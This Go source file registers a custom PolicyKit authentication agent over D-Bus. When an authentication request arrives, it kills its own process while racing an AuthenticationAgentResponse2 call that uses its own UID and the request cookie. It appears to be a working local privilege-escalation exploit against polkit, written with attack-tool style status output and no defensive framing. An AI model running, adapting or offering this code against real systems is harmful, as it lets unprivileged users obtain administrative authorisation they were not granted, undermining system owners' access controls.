package main

import (
	"fmt"
	"os"
	"syscall"
	"time"

	"github.com/godbus/dbus/v5"
)

var PolicyKitName = "org.freedesktop.PolicyKit1"
var PolicyKitInterface = "org.freedesktop.PolicyKit1.Authority"
var PolicyKitObjectPath = "/org/freedesktop/PolicyKit1/Authority"
var PolicyKitAgentInterface = "org.freedesktop.PolicyKit1.AuthenticationAgent"
var PolicyKitAgentObjectPath = "/org/freedesktop/PolicyKit1/AuthenticationAgent"

type Subject struct {
	Type string                  `dbus:"s"`
	Data map[string]dbus.Variant `dbus:"a{sv}"`
}

type Identity struct {
	Type string                  `dbus:"s"`
	Data map[string]dbus.Variant `dbus:"a{sv}"`
}

type Agent struct {
	Conn      *dbus.Conn
	Authority *dbus.BusObject
	Subject   *Subject
}

func (agent Agent) RegisterAgent() {
	fmt.Printf("[*] Registering PolicyKit authentication agent ... \n")

	call := (*agent.Authority).Call(PolicyKitInterface+".RegisterAuthenticationAgent", 0,
		agent.Subject, "en_US.UTF-8", PolicyKitAgentObjectPath)

	if call.Err != nil {
		fmt.Printf("[-] Error while registering authentication agent: %s\n", call.Err)
		os.Exit(2)
	}
}

func Kill(pid int) {
	time.Sleep(time.Millisecond * 10)
	syscall.Kill(pid, syscall.SIGKILL)
}

func (agent Agent) BeginAuthentication(action string, _ string, _ string, _ map[string]string,
	cookie string, identities []Identity) *dbus.Error {
	fmt.Printf("[+] Received authentication request\n- Cookie: %s\n- Action ID: %s\n", cookie, action)

	go Kill(os.Getpid())
	go (*agent.Authority).Call(PolicyKitInterface+".AuthenticationAgentResponse2", 0,
		uint32(os.Getuid()), cookie, identities[0])
	time.Sleep(time.Millisecond * 1)
	return nil
}

func (agent Agent) StartAgent() {
	conn, err := dbus.ConnectSystemBus()
	if err != nil {
		fmt.Printf("[-] Error for connecting system bus: %s\n", err)
		os.Exit(1)
	}

	// setup
	agent.Conn = conn
	agent.Subject = new(Subject)
	agent.Subject.Type = "unix-process"

	agent.Subject.Data = make(map[string]dbus.Variant)
	agent.Subject.Data["pid"] = dbus.MakeVariant(uint32(os.Getpid()))
	agent.Subject.Data["start-time"] = dbus.MakeVariant(uint64(0))

	// set authority
	obj := agent.Conn.Object(PolicyKitName, dbus.ObjectPath(PolicyKitObjectPath))
	agent.Authority = &obj

	// export methods
	mapping := make(map[string]string)
	mapping["BeginAuthentication"] = "BeginAuthentication"
	agent.Conn.ExportWithMap(agent, mapping, dbus.ObjectPath(PolicyKitAgentObjectPath), PolicyKitAgentInterface)
	agent.RegisterAgent()

	fmt.Println("[*] Authentication agent main loop running ...")
}
